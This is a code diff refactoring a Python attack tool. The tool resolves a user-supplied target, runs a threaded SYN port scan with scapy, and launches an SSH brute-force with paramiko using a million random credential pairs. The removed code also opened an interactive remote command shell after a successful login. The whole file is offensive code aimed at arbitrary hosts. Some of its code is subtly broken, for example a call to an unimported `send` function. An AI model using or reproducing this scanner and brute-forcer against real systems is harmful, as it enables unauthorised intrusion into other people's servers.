@@ -1,170 +1,103 @@
 import socket
 import paramiko
-from urllib.parse import urlparse
+import threading
 import random
 import string
-from scapy.all import *
-from scapy.layers.inet import *
 import os
 import platform
-import time
+import logging
+from urllib.parse import urlparse
+from scapy.all import sr1, IP, TCP
 
-tcp_ports = []
-paramiko.util.log_to_file('paramiko.log')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 
 def resolve_url(url):
     try:
         if not urlparse(url).scheme:
             url = 'http://' + url
-            parsed_url = urlparse(url)
-            hostname = parsed_url.hostname
-            ip_address = socket.gethostbyname(hostname)
-            return ip_address
-
-    except:
+        hostname = urlparse(url).hostname
+        return socket.gethostbyname(hostname)
+    except Exception as e:
+        logging.error(f"Failed to resolve URL: {e}")
         return None
 
 
-def ping(host, port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
-        s.connect((host, port))
-        s.close()
-        return True
+def scan_port(host, port, open_ports):
+    scan = IP(dst=host) / TCP(dport=port, flags='S')
+    resp = sr1(scan, verbose=0, timeout=0.5)
 
-    except:
-        return False
+    if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12:
+        open_ports.append(port)
+        logging.info(f"Port {port} is open on {host}")
+        send(IP(dst=host) / TCP(dport=port, flags='R'))  # Reset connection
 
 
-def tcp_scan(target):
-    ports = []
-    for port in range(1, 65536):
-        ports.append(port)
+def tcp_scan(target, ports_to_scan=None):
+    open_ports = []
+    ports = ports_to_scan if ports_to_scan else range(1, 1025)  # Scan common ports
+    threads = []
 
     for port in ports:
-        scan = IP(dst=target) / TCP(dport=port, flags='S')
-        resp = sr1(scan, verbose=0, timeout=0.5)
-        print(resp)
+        thread = threading.Thread(target=scan_port, args=(target, port, open_ports))
+        thread.start()
+        threads.append(thread)
 
-        if resp is not None:
-            if resp.haslayer(TCP) and resp.getlayer(TCP.flags) == 0x12:
-                tcp_ports.append(port)
-                send(IP(dst=target) / TCP(dport=port, flags='A'))
-                send(IP(dst=target) / TCP(dport=port, flags='R'))
+    for thread in threads:
+        thread.join()
 
-def scan_port(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(0.5)
-    result = s.connect_ex((host, port))
-    s.close()
-    return result == 0
+    return open_ports
 
+
+def generate_credentials(num_entries=1000000, min_length=1, max_length=16):
+    usernames = [''.join(random.choices(string.ascii_letters + string.digits + string.punctuation,
+                                        k=random.randint(min_length, max_length))) for _ in range(num_entries)]
+    passwords = [''.join(random.choices(string.ascii_letters + string.digits + string.punctuation,
+                                        k=random.randint(min_length, max_length))) for _ in range(num_entries)]
+    return usernames, passwords
 
 
 def ssh_brute_force(host, port):
-
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    usernames, passwords = generate_credentials()
 
-    min_lenght = 1
-    max_lenght = 16
-
-    usernames = []
-    passwords = []
-
-    for i in range(1000000):
-
-        username_lenght = random.randint(min_lenght, max_lenght)
-        password_lenght = random.randint(min_lenght, max_lenght)
-
-        username = ''.join(random.choice(string.ascii_letters +string.digits + string.punctuation) for i in range(username_lenght))
-        password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(password_lenght))
-
-        usernames.append(username)
-        passwords.append(password)
-
-
-    ip_address = host
+    logging.info("Starting infinite SSH brute-force attack...")
 
     for username, password in zip(usernames, passwords):
         try:
-            ssh_client.connect(host, port, username, password, timeout=60)
-            print(f'Successful login - Username: {username}, Password: {password}')
-            print(f"IP address for {host}: {ip_address}")
-            print("Connection options:")
-            print(f"SSH: ssh {host}")
-            print(f"HTTP: http://{host}")
-            print(f"HTTPS: https://{host}")
-
-            while True:
-                command = input("Please enter your command right below (or type 'Exit' to quit):\n->")
-                if command.lower() == 'exit':
-                    print('Goodbye and thank you for using the machine!')
-                    time.sleep(2)
-                    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-                    break
-
-                stdin, stdout, stderr = ssh_client.exec_command(command)
-                print(stdout.read().decode())
-                ssh_client.close()
-
+            ssh_client.connect(host, port, username, password, timeout=5)
+            logging.info(f"SSH login found! Username: {username}, Password: {password}")
+            return True
         except paramiko.AuthenticationException:
-            print(f'Failed login attempt - Username: {username}, Password: {password}')
-
+            pass
         except Exception as e:
-            print(f'An error occurred: {e}')
-
-        else:
-            print("Failed to list connection options.")
-
-    return False
-
-
+            logging.error(f"SSH brute-force attempt failed: {e}")
+            return False
 
 
 def main():
-
     os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-    target_url = input("Enter the URL of the target: ")
-    target_port = 22
+    target_url = input("Enter target URL: ")
     target_host = resolve_url(target_url)
 
-    if target_host:
-        print(f"Resolved IP address for {target_url}: {target_host}")
+    if not target_host:
+        logging.error("Invalid target.")
+        return
 
-        if ping(target_host,target_port):
-            print("Host is reachable, Performing a TCP Scan!")
-            time.sleep(2.5)
-            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-            tcp_scan(target_url)
+    logging.info(f"Scanning {target_host}...")
+    open_ports = tcp_scan(target_host)
+    logging.info(f"Open ports: {open_ports}")
 
-            if scan_port(target_host, target_port):
-                time.sleep(2)
-                os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-                print("Port 22 (SSH) is open. Attempting SSH brute-force:\n")
-                if ssh_brute_force(target_host, target_port):
-                    print("SSH login successful.")
-
-                else:
-                    print("SSH login failed.")
-
-            else:
-                print("Port 22 (SSH) is closed.")
-                time.sleep(1)
-                os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-
+    if 22 in open_ports:
+        confirmation = input("Port 22 is open. Do you want to attempt SSH brute-force? (yes/no): ")
+        if confirmation.lower() == 'yes':
+            ssh_brute_force(target_host, 22)
         else:
-            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-            print("Host is unreachable.")
-            time.sleep(1)
-            os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+            logging.info("SSH brute-force attack skipped.")
     else:
-        os.system('cls' if platform.system().lower() == 'windows' else 'clear')
-        print("Failed to resolve URL.")
-        time.sleep(1)
-        os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+        logging.info("Port 22 (SSH) is closed.")
+
 
 if __name__ == "__main__":
     main()
